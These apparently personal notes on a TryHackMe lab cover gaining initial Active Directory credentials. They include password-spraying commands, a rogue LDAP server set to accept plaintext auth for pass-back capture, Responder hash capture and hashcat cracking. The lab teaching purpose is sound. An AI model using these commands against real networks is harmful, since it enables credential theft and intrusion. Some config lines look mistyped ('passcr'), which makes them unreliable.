# breaching AD
Before we can exploit AD misconfigurations for privilege escalation, lateral movement, and goal execution, you need initial access first. You need to acquire an initial set of valid AD credentials. Due to the number of AD services and features, the attack surface for gaining an initial set of AD credentials is usually significant. In this room, we will discuss several avenues, but this is by no means an exhaustive list. 

## OSINT and Phishing

Use sites as [HaveIBeenpwned](https://haveibeenpwned.com/), GitHub and other to search for data leaks.

## NTLM Authenticated Services

Examples of NetNTLM servicies

1. Internally-hosted Exchange (Mail) servers that expose an Outlook Web App (OWA) login portal.
2. Remote Desktop Protocol (RDP) service of a server being exposed to the internet.
3. Exposed VPN endpoints that were integrated with AD.
4. Web applications that are internet-facing and make use of NetNTLM.

### Password spraying attack
Instead choosing one user and try to brute force passwords. We will choose one password and try different usernames.
[Python Script](ntlm_passwordspray.py)
<pre>python3 ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com/</pre>

## LDAP Bind Credentials

### LDAP Pass-back Attacks
In an LDAP Pass-back attack, we can modify this IP to our IP and then test the LDAP configuration, which will force the device to attempt LDAP authentication to our rogue device. We can intercept this authentication attempt to recover the LDAP credentials.

Default port of LDAP is 389.

So we can start listening. 
<pre>sudo nc -lvp 389</pre>

#### supportedCapabilities
<pre>
Listening on 0.0.0.0 389
Connection received on 10.200.32.201 54017
0�Dc�;

x�
  objectclass0�supportedCapabilities
</pre>

If it looks like this `supportedCapabilities` means the connection is not secure and we need to configurate better more secure server

### Hosting a Rogue LDAP Server

<pre>
sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd

sudo dpkg-reconfigure -p low slapd
</pre>

1. Press no.

2. For the domain name choose `za.tryhackme.com`, for the organization choose `za.tryhackme.com` as well.

3. Choose a password. 

4. Select MDB database to use

5. For the last two options, ensure the database is not removed when purged.

6. setup the `olcSaslSecProps.ldif` file

<pre>#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcr</pre>

<pre> sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart

ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms</pre>

7. Setup listener
<pre> sudo tcpdump -SX -i breachad tcp port 389</pre>

8. Set your IP and you are ready to go

## Authentication Relays

Start listener 

<pre>sudo responder -I breachad</pre>

You can get Username and Hash from communication

crack it
<pre>hashcat -m 5600 <hash file> <password file> --force</pre>

## Microsoft Deployment Toolkit